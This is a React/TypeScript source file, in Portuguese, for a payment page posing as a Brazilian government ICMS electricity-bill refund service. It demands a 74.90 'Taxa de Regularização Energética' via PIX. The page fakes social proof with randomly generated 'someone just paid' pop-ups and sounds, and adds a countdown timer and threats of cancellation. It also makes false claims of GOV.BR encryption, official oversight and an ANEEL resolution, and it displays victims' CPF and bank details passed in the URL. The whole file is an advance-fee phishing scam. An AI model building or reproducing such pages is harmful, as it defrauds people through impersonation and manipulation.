import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Copy, CheckCircle, Info, AlertCircle, AlertTriangle, Bell, Loader, BankIcon } from "lucide-react";
import { Separator } from "@/components/ui/separator";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { Toaster } from "@/components/ui/toaster";
import { playNotificationSound } from "@/components/NotificationSound";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { paymentApi } from "@/lib/for4payments";

// Gerar um código PIX aleatório
const gerarCodigoPix = () => {
  const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  let codigo = "";
  for (let i = 0; i < 32; i++) {
    codigo += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return codigo.match(/.{1,4}/g)?.join(" ") || "";
};

// Nomes para as notificações
const nomes = [
  "Pedro", "Maria", "João", "Ana", "Carlos", "Fernanda", "Lucas", "Júlia", 
  "Rafael", "Mariana", "Bruno", "Camila", "Diego", "Isabela", "Gustavo", 
  "Letícia", "Henrique", "Amanda", "Felipe", "Natália", "Ricardo", "Larissa",
  "Rodrigo", "Carla", "Alexandre", "Beatriz", "Eduardo", "Vanessa", "Marcelo", "Bianca"
];

// Componente de notificação
interface NotificacaoProps {
  nome: string;
  valor: string;
  onClose: () => void;
}

const Notificacao = ({ nome, valor, onClose }: NotificacaoProps) => {
  // Não precisamos mais tocar o som aqui, pois já estamos tocando no nível superior
  // Este componente agora é apenas visual
  
  return (
    <div className="max-w-sm w-full bg-white shadow-lg rounded-lg border border-gray-200 overflow-hidden">
      <div className="flex items-start p-3">
        <div className="flex-shrink-0 pt-0.5">
          <div className="h-8 w-8 rounded-full bg-green-100 flex items-center justify-center">
            <Bell className="h-4 w-4 text-green-600" />
          </div>
        </div>
        <div className="ml-3 w-0 flex-1">
          <p className="text-sm font-medium text-gray-900">
            Nova transação
          </p>
          <p className="mt-1 text-sm text-gray-500">
            <strong>{nome}</strong> acabou de pagar a TRE para uma restituição de <strong className="text-green-600">{valor}</strong>
          </p>
        </div>
        <div className="ml-4 flex-shrink-0 flex">
          <button
            className="bg-white rounded-md inline-flex text-gray-400 hover:text-gray-500 focus:outline-none"
            onClick={onClose}
          >
            <span className="sr-only">Fechar</span>
            <svg className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
              <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
          </button>
        </div>
      </div>
    </div>
  );
};

// Formatar um valor monetário
const formatarValor = (valor: number) => {
  return valor.toLocaleString('pt-BR', { 
    style: 'currency', 
    currency: 'BRL' 
  });
};

// Interface para as informações do pagamento da API
interface PaymentInfo {
  id: string;
  pixCode: string;
  pixQrCode: string;
  expiresAt: string;
  status: string;
}

// Componente principal da página
export default function PagamentoPix() {
  const [location, navigate] = useLocation();
  const { toast } = useToast();
  
  // Obter parâmetros da URL
  const urlParams = new URLSearchParams(window.location.search);
  
  // Dados da restituição
  const cpf = urlParams.get('cpf') || "";
  const nome = urlParams.get('nome') || "";
  
  // Corrigir a formatação do valor - converter centavos para reais
  let valor = 0;
  const valorParam = urlParams.get('valor') || "0";
  if (valorParam) {
    // Se o valor for maior que 10.000, provavelmente está em centavos
    // e precisa ser convertido para reais
    const valorNumerico = parseFloat(valorParam);
    valor = valorNumerico > 10000 ? valorNumerico / 100 : valorNumerico;
  }
  
  const companhia = urlParams.get('companhia') || "CEMIG Distribuição";
  const estado = urlParams.get('estado') || "Minas Gerais";
  const dataNascimento = urlParams.get('nasc') || "21/07/2003";
  const bancoNome = urlParams.get('bancoNome') || "Banco do Brasil";
  
  const email = urlParams.get('email') || `${cpf.substring(0, 3)}xxx${cpf.substring(9, 11)}@restituicao.gov.br`;
  const telefone = urlParams.get('telefone') || `(11) 9${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`;
  const valorFormatado = formatarValor(valor);
  const valorTaxaFormatado = formatarValor(74.90);
  const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  
  // Estados relacionados ao pagamento
  const [isLoading, setIsLoading] = useState(false);
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<string>('pending');
  const [codigoPix, setCodigoPix] = useState('');
  const [copied, setCopied] = useState(false);
  
  // Estado para as notificações
  const [notificacoes, setNotificacoes] = useState<{ id: number; nome: string; valor: string }[]>([]);
  
  // Estado para o contador regressivo (20 minutos = 1200 segundos)
  const [tempoRestante, setTempoRestante] = useState(1200);
  
  // Gerar um valor aleatório para notificações
  const gerarValorAleatorio = () => {
    const valor = 1800 + Math.random() * 1200; // Entre 1800 e 3000
    return formatarValor(valor);
  };
  
  // Função para gerar uma notificação
  const gerarNotificacao = () => {
    const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
    const valorAleatorio = gerarValorAleatorio();
    
    // Gera um ID único com timestamp + número aleatório para evitar colisões
    const id = Date.now() + Math.floor(Math.random() * 10000);
    setNotificacoes(prev => [...prev, { id, nome: nomeAleatorio, valor: valorAleatorio }]);
  };
  
  // Remover uma notificação
  const removerNotificacao = (id: number) => {
    setNotificacoes(prev => prev.filter(notif => notif.id !== id));
  };
  
  // Copiar o código PIX
  const copiarCodigoPix = () => {
    // Não modificar o código PIX, copiar exatamente como veio da API
    navigator.clipboard.writeText(codigoPix);
    setCopied(true);
    toast({
      title: "Código copiado!",
      description: "O código PIX foi copiado para a área de transferência.",
    });
    
    setTimeout(() => setCopied(false), 3000);
  };
  
  // Simular o pagamento (para fins de demonstração)
  const simularPagamento = () => {
    navigate("/sucesso");
  };
  
  // Formatar o tempo do contador (mm:ss)
  const formatarTempo = (segundos: number) => {
    const minutos = Math.floor(segundos / 60);
    const segs = segundos % 60;
    return `${minutos.toString().padStart(2, '0')}:${segs.toString().padStart(2, '0')}`;
  };
  
  // Criar pagamento PIX
  const criarPagamento = async () => {
    try {
      setIsLoading(true);
      
      // Chamar a API para criar um pagamento
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          nome: nome,
          cpf: cpf,
          email: email,
          telefone: telefone,
          valor: 74.90
        })
      });

      if (!response.ok) {
        throw new Error('Falha ao gerar o pagamento');
      }

      const payment = await response.json();
      setPaymentInfo(payment);
      setCodigoPix(payment.pixCode);
      
      toast({
        title: "Pagamento gerado com sucesso!",
        description: "Use o QR code ou código PIX para efetuar o pagamento."
      });
    } catch (error) {
      console.error('Erro ao criar pagamento:', error);
      toast({
        title: "Erro ao gerar pagamento",
        description: "Não foi possível gerar o código PIX. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Verificar status do pagamento
  const verificarStatusPagamento = async () => {
    if (!paymentInfo?.id) return;
    
    setIsLoading(true);
    
    try {
      const response = await fetch(`/api/pagamentos/${paymentInfo.id}/status`);
      
      if (response.ok) {
        const data = await response.json();
        setPaymentStatus(data.status);
        
        if (data.status === 'completed') {
          toast({
            title: "Pagamento confirmado!",
            description: "Seu pagamento foi processado com sucesso. Redirecionando...",
            variant: "default"
          });
          
          // Redirecionar para a página de sucesso com todos os parâmetros necessários
          const params = new URLSearchParams({
            cpf: cpf,
            nome: nome,
            valor: valor.toString(),
            pagamentoId: paymentInfo.id,
            dataPagamento: new Date().toISOString(),
            companhia: companhia,
            estado: estado,
            nasc: dataNascimento,
            agencia: urlParams.get('agencia') || "",
            conta: urlParams.get('conta') || "",
            email: email,
            telefone: telefone
          });
          
          // Redirecionar para a página de sucesso
          setTimeout(() => {
            navigate(`/sucesso?${params.toString()}`);
          }, 1500);
        }
      }
    } catch (error) {
      console.error('Erro ao verificar status do pagamento:', error);
      toast({
        title: "Erro na verificação",
        description: "Não foi possível verificar o status do pagamento. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  // Efeito para criar o pagamento quando a página carregar
  useEffect(() => {
    criarPagamento();
  }, []);

  // Efeito para verificar o status do pagamento periodicamente
  useEffect(() => {
    if (!paymentInfo?.id) return;
    
    // Verificação inicial
    verificarStatusPagamento();
    
    // Configurar intervalo para verificar a cada 10 segundos
    const statusInterval = setInterval(() => {
      verificarStatusPagamento();
    }, 10000); // Verificar a cada 10 segundos
    
    return () => {
      clearInterval(statusInterval);
    };
  }, [paymentInfo]);

  // Efeito para o contador regressivo
  useEffect(() => {
    // Contador regressivo
    const timerInterval = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timerInterval);
          toast({
            title: "Tempo esgotado!",
            description: "O tempo para pagamento da TRE expirou.",
            variant: "destructive",
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(timerInterval);
    };
  }, []);
  
  // Efeito separado apenas para o sistema de notificações
  // Isso ajuda a evitar problemas de re-renderização causando múltiplas notificações
  useEffect(() => {
    // Referência para os timeouts que vamos limpar no unmount
    const timeoutRefs: NodeJS.Timeout[] = [];
    
    // Limpar notificações anteriores
    setNotificacoes([]);
    
    // Função recursiva para criar o ciclo de notificações
    function criarCicloNotificacoes(tempoInicial: number) {
      // 1. Agendar aparecimento da notificação
      const notificationTimeout = setTimeout(() => {
        // Tocar o som de notificação
        playNotificationSound();
        
        // Criar uma notificação
        const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
        const valorAleatorio = gerarValorAleatorio();
        const id = Date.now();
        
        // Adicionar a notificação ao estado
        setNotificacoes([{ id, nome: nomeAleatorio, valor: valorAleatorio }]);
        
        // 2. Agendar remoção da notificação após 5 segundos
        const removalTimeout = setTimeout(() => {
          // Remover a notificação
          setNotificacoes([]);
          
          // 3. Agendar próxima notificação após 7 segundos do desaparecimento
          criarCicloNotificacoes(7000);
        }, 5000);
        
        // Guardar a referência para limpar no unmount
        timeoutRefs.push(removalTimeout);
        
      }, tempoInicial);
      
      // Guardar a referência para limpar no unmount
      timeoutRefs.push(notificationTimeout);
    }
    
    // Iniciar o primeiro ciclo após 7 segundos
    criarCicloNotificacoes(7000);
    
    // Limpar todos os timeouts no unmount para evitar memory leaks
    return () => {
      timeoutRefs.forEach(timeout => clearTimeout(timeout));
    };
  }, []);

  return (
    <>
      <Header />
      <main className="container mx-auto px-4 py-8 min-h-screen">
        {/* Este componente é necessário para o toast */}
        <Toaster />
        
        {/* Notificações flutuantes - Aparecem no canto superior direito */}
        <div className="fixed top-4 right-4 z-50 w-full max-w-sm space-y-2">
          {notificacoes.map((notif) => (
            <Notificacao
              key={notif.id}
              nome={notif.nome}
              valor={notif.valor}
              onClose={() => removerNotificacao(notif.id)}
            />
          ))}
        </div>
        
        <div className="p-6 relative bg-gray-50 rounded-lg shadow-md max-w-6xl mx-auto">
          <div className="flex justify-between items-center mb-4 border-b pb-3 border-gray-300">
            <div className="text-left">
              <h3 className="text-[var(--gov-blue-dark)] font-bold text-lg">Restituição de ICMS</h3>
              <p className="text-xs text-gray-600">Protocolo nº {cpf.substring(0,4)}4714{cpf.substring(6,9)}</p>
            </div>
            <div className="text-right">
              <p className="font-semibold text-red-600">Taxa de Regularização: {valorTaxaFormatado}</p>
              <p className="text-xs text-gray-600">Vencimento: <span className="countdown font-medium">{formatarTempo(tempoRestante)}</span></p>
            </div>
          </div>
          
          <div className="mb-5">
            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">DADOS DO SOLICITANTE</div>
            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <p className="mb-1 text-xs text-gray-500">Nome completo</p>
                  <p className="font-medium text-gray-800 mb-3">{nome}</p>
                  <p className="mb-1 text-xs text-gray-500">CPF</p>
                  <p className="font-medium text-gray-800 mb-3">{cpfFormatado}</p>
                  <p className="mb-1 text-xs text-gray-500">Companhia Elétrica</p>
                  <p className="font-medium text-gray-800">{companhia}</p>
                </div>
                <div>
                  <div className="p-3 bg-amber-50 border-l-4 border-amber-400 mb-3">
                    <p className="text-amber-800 font-medium text-sm">Situação da solicitação:</p>
                    <p className="text-red-600 font-bold">PENDENTE - AGUARDANDO PAGAMENTO</p>
                  </div>
                  <div className="flex items-center mb-3">
                    <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs text-gray-500 mb-0">Valor aprovado</p>
                      <p className="font-semibold text-gray-800">{valorFormatado}</p>
                    </div>
                  </div>
                  <div className="flex items-center">
                    <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 14v3m4-3v3m4-3v3M3 21h18M3 10h18M3 7l9-4 9 4M4 10h16v11H4V10z" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs text-gray-500 mb-0">Banco para depósito</p>
                      <p className="font-semibold text-gray-800">{bancoNome || "Banco informado"}</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">DETALHES DA RESTITUIÇÃO</div>
            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
              <div className="flex flex-wrap -mx-2">
                <div className="w-full md:w-1/3 px-2 mb-3 md:mb-0">
                  <div className="p-3 bg-gray-100 rounded-md h-full">
                    <p className="text-xs text-gray-500 mb-1">Taxa de Regularização</p>
                    <p className="font-medium text-red-600">{valorTaxaFormatado}</p>
                  </div>
                </div>
                <div className="w-full md:w-1/3 px-2 mb-3 md:mb-0">
                  <div className="p-3 bg-gray-100 rounded-md h-full">
                    <p className="text-xs text-gray-500 mb-1">Valor aprovado</p>
                    <p className="font-medium text-green-600">{valorFormatado}</p>
                  </div>
                </div>
                <div className="w-full md:w-1/3 px-2">
                  <div className="p-3 bg-gray-100 rounded-md h-full">
                    <p className="text-xs text-gray-500 mb-1">Prazo de pagamento</p>
                    <p className="font-medium text-amber-600">{formatarTempo(tempoRestante)}</p>
                  </div>
                </div>
              </div>
              
              <div className="mt-4 bg-blue-50 p-3 border-l-4 border-blue-400 rounded-r-md">
                <div className="flex items-start">
                  <div className="text-blue-500 mt-1 mr-2">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </div>
                  <div>
                    <p className="text-sm text-blue-800 font-medium">Importante: <span className="font-normal">Prazo de depósito</span></p>
                    <p className="text-xs text-gray-600 mt-1">Após a confirmação do pagamento da Taxa de Regularização, o valor de {valorFormatado} será depositado em sua conta bancária em até 72 horas úteis.</p>
                  </div>
                </div>
              </div>
            </div>
            
            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">PAGAMENTO VIA PIX</div>
            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
              <div className="mb-4">
                <div className="flex justify-center">
                  <Tabs defaultValue="qrcode" className="w-full">
                    <TabsList className="w-full mb-4">
                      <TabsTrigger value="qrcode" className="flex-1">QR Code PIX</TabsTrigger>
                      <TabsTrigger value="copiacola" className="flex-1">Copia e Cola</TabsTrigger>
                    </TabsList>
                    
                    <TabsContent value="qrcode" className="mt-2">
                      <div className="flex flex-col items-center justify-center">
                        {isLoading ? (
                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
                          </div>
                        ) : !paymentInfo ? (
                          <div className="py-8 text-center space-y-4">
                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
                            <Button 
                              onClick={criarPagamento} 
                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
                            >
                              Tentar Novamente
                            </Button>
                          </div>
                        ) : (
                          <>
                            <div className="border-4 border-[var(--gov-blue)] rounded-lg p-3 mb-4 bg-white max-w-xs">
                              <img 
                                src={paymentInfo.pixQrCode}
                                alt="QR Code do PIX" 
                                className="w-full h-auto" 
                              />
                            </div>
                            <div className="bg-gray-50 w-full max-w-sm p-4 rounded-lg text-center border border-gray-200">
                              <p className="text-sm text-gray-600 mb-1">Valor a ser pago:</p>
                              <p className="text-2xl font-bold text-[var(--gov-blue-dark)]">{valorTaxaFormatado}</p>
                              <p className="text-xs text-gray-500 mt-1">TRE - Taxa de Regularização Energética</p>
                            </div>
                          </>
                        )}
                      </div>
                    </TabsContent>
                    
                    <TabsContent value="copiacola" className="mt-2">
                      <div>
                        {isLoading ? (
                          <div className="py-8 flex flex-col items-center justify-center space-y-3">
                            <Loader className="h-10 w-10 text-[var(--gov-blue)] animate-spin" />
                            <p className="text-[var(--gov-blue-dark)]">Gerando código de pagamento...</p>
                          </div>
                        ) : !paymentInfo ? (
                          <div className="py-8 text-center space-y-4">
                            <AlertCircle className="h-10 w-10 text-red-500 mx-auto" />
                            <p className="text-red-600">Não foi possível gerar o código PIX</p>
                            <Button 
                              onClick={criarPagamento} 
                              className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
                            >
                              Tentar Novamente
                            </Button>
                          </div>
                        ) : (
                          <>
                            <p className="text-sm text-gray-600 mb-2 text-center">Copie o código abaixo:</p>
                            <div className="flex items-center max-w-xl mx-auto">
                              <div className="flex-1 bg-white border border-gray-300 p-3 rounded-l-md font-mono text-xs break-all">
                                {codigoPix}
                              </div>
                              <button 
                                onClick={copiarCodigoPix}
                                className="bg-[var(--gov-blue)] text-white p-3 rounded-r-md hover:bg-[var(--gov-blue-dark)]"
                              >
                                {copied ? <CheckCircle className="h-5 w-5" /> : <Copy className="h-5 w-5" />}
                              </button>
                            </div>
                            <div className="bg-gray-100 p-4 rounded-md text-gray-700 text-sm mt-4 max-w-xl mx-auto">
                              <h4 className="font-semibold mb-2">Como pagar com o PIX Copia e Cola:</h4>
                              <ol className="list-decimal pl-5 space-y-1">
                                <li>Clique no botão azul acima para copiar o código</li>
                                <li>Abra o aplicativo do seu banco</li>
                                <li>Vá para a área de PIX ou pagamentos</li>
                                <li>Selecione a opção "Pix Copia e Cola"</li>
                                <li>Cole o código e confirme o pagamento</li>
                              </ol>
                            </div>
                          </>
                        )}
                      </div>
                    </TabsContent>
                  </Tabs>
                </div>
              </div>
              
              <div className="mt-6">
                <Button 
                  onClick={verificarStatusPagamento}
                  disabled={!paymentInfo || isLoading || paymentStatus === 'completed'}
                  className={`w-full font-bold py-6 text-lg mb-3 transition-all duration-300 transform hover:scale-105 ${
                    paymentStatus === 'completed' 
                      ? 'bg-green-500 hover:bg-green-600 text-white' 
                      : 'bg-[var(--gov-green)] hover:bg-[var(--gov-green)]/90 text-white'
                  }`}
                >
                  {paymentStatus === 'completed' ? (
                    <div className="flex items-center justify-center">
                      <CheckCircle className="mr-2 h-5 w-5" />
                      Pagamento Confirmado
                    </div>
                  ) : isLoading ? (
                    <div className="flex items-center justify-center">
                      <Loader className="mr-2 h-5 w-5 animate-spin" />
                      Verificando...
                    </div>
                  ) : (
                    "Já fiz o pagamento"
                  )}
                </Button>
                
                <div className="bg-red-600 p-4 rounded-md mb-4 text-white shadow-md">
                  <div className="flex items-center mb-2">
                    <AlertTriangle className="h-5 w-5 text-yellow-300 mr-2" />
                    <h3 className="font-bold text-base">NOTIFICAÇÃO OFICIAL</h3>
                  </div>
                  <p className="mb-3 text-sm">
                    Ao prosseguir, você concordou com o pagamento da Taxa de Regularização no valor de <strong>{valorTaxaFormatado}</strong>. 
                    Conforme a resolução ANEEL nº 1.000/2021, o não pagamento resultará em <strong>cancelamento automático</strong> da sua solicitação de restituição.
                  </p>
                  <p className="font-semibold text-sm">
                    Efetue o pagamento em até <span className="font-bold">{formatarTempo(tempoRestante)}</span> para garantir sua restituição de <strong>{valorFormatado}</strong>.
                  </p>
                </div>
              </div>
            </div>
          </div>
          
          {/* Seção de Garantia de Segurança - Movida conforme solicitado */}
          <div className="mb-5">
            <div className="border border-green-200 bg-green-50 rounded-lg p-5 shadow-sm">
              <div className="flex items-center mb-3">
                <div className="w-10 h-10 rounded-full bg-green-100 flex items-center justify-center mr-3">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-green-700" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                </div>
                <h3 className="font-bold text-green-800 text-xl">GARANTIA DE SEGURANÇA</h3>
              </div>
              
              <p className="text-green-700 ml-2 text-lg mb-4">
                Este procedimento é fiscalizado e regulamentado por órgãos oficiais, com garantia de:
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
                <div className="bg-white p-4 rounded-lg border border-green-200 shadow-sm">
                  <div className="flex items-start">
                    <div className="flex-shrink-0 mt-1">
                      <CheckCircle className="h-5 w-5 text-green-600" />
                    </div>
                    <p className="ml-3 text-green-800 font-medium">
                      Conformidade com a LGPD (Lei Geral de Proteção de Dados)
                    </p>
                  </div>
                </div>
                
                <div className="bg-white p-4 rounded-lg border border-green-200 shadow-sm">
                  <div className="flex items-start">
                    <div className="flex-shrink-0 mt-1">
                      <CheckCircle className="h-5 w-5 text-green-600" />
                    </div>
                    <p className="ml-3 text-green-800 font-medium">
                      Consultas criptografadas com tecnologia GOV.BR
                    </p>
                  </div>
                </div>
                
                <div className="bg-white p-4 rounded-lg border border-green-200 shadow-sm">
                  <div className="flex items-start">
                    <div className="flex-shrink-0 mt-1">
                      <CheckCircle className="h-5 w-5 text-green-600" />
                    </div>
                    <p className="ml-3 text-green-800 font-medium">
                      Registro no sistema nacional de restituição tarifária
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Seção de Perguntas Frequentes - Mantemos abaixo após a Garantia */}
          <div>
            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">PERGUNTAS FREQUENTES</div>
            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
              <div className="space-y-4">
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">1. O que é a Taxa de Regularização Energética (TRE)?</h3>
                  <p className="text-sm text-gray-600">
                    A TRE é uma taxa administrativa que cobre os custos de processamento e regularização do seu pedido de restituição de valores cobrados indevidamente nas faturas de energia elétrica.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">2. Por que preciso pagar a TRE?</h3>
                  <p className="text-sm text-gray-600">
                    Conforme a resolução normativa ANEEL nº 1.000/2021, a taxa é necessária para cobrir os custos operacionais e administrativos do processo de restituição, incluindo verificação, processamento e transferência bancária.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">3. Quanto tempo leva para receber minha restituição?</h3>
                  <p className="text-sm text-gray-600">
                    Após a confirmação do pagamento da TRE, o valor da sua restituição será depositado na conta bancária informada em até 3 dias úteis.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">4. Por que preciso fazer o pagamento via PIX?</h3>
                  <p className="text-sm text-gray-600">
                    O PIX foi escolhido como método de pagamento por sua rapidez, segurança e rastreabilidade. Isso permite que sua restituição seja processada de forma mais ágil.
                  </p>
                </div>
                
                <div>
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">5. O que acontece se eu não pagar a TRE no prazo?</h3>
                  <p className="text-sm text-gray-600">
                    Se o pagamento não for realizado dentro do prazo estabelecido, sua solicitação será automaticamente cancelada e você precisará iniciar um novo processo de solicitação de restituição.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}